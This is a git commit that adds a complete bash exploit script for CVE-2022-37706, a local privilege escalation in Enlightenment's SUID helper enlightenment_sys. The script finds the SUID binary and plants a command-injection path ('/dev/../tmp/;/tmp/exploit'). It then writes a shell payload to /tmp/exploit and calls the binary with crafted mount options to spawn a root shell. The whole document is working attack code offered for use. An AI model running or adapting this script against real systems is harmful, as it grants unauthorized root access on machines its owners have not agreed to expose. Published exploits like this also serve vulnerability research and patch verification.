2bc30e472072fa38d6c72a1e02ddef18e1702d12
MaherAzzouzi <maherazz04@gmail.com>
2022-09-12 20:25:09 +0100

    CVE-2022-37706 Exploit Local Privilege Escalation

---
+++ exploit.sh
@@ -0,0 +1,23 @@
+#!/bin/bash
+
+echo "CVE-2022-37706"
+echo "[*] Trying to find the vulnerable SUID file..."
+echo "[*] This may take few seconds..."
+
+file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null)
+if [[ -z ${file} ]]
+then
+	echo "[-] Couldn't find the vulnerable SUID file..."
+	echo "[*] Enlightenment should be installed on your system."
+	exit 1
+fi
+
+echo "[+] Vulnerable SUID binary found!"
+echo "[+] Trying to pop a root shell!"
+mkdir -p /tmp/net
+mkdir -p "/dev/../tmp/;/tmp/exploit"
+
+echo "/bin/sh" > /tmp/exploit
+chmod a+x /tmp/exploit
+echo "[+] Enjoy the root shell :)"
+${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
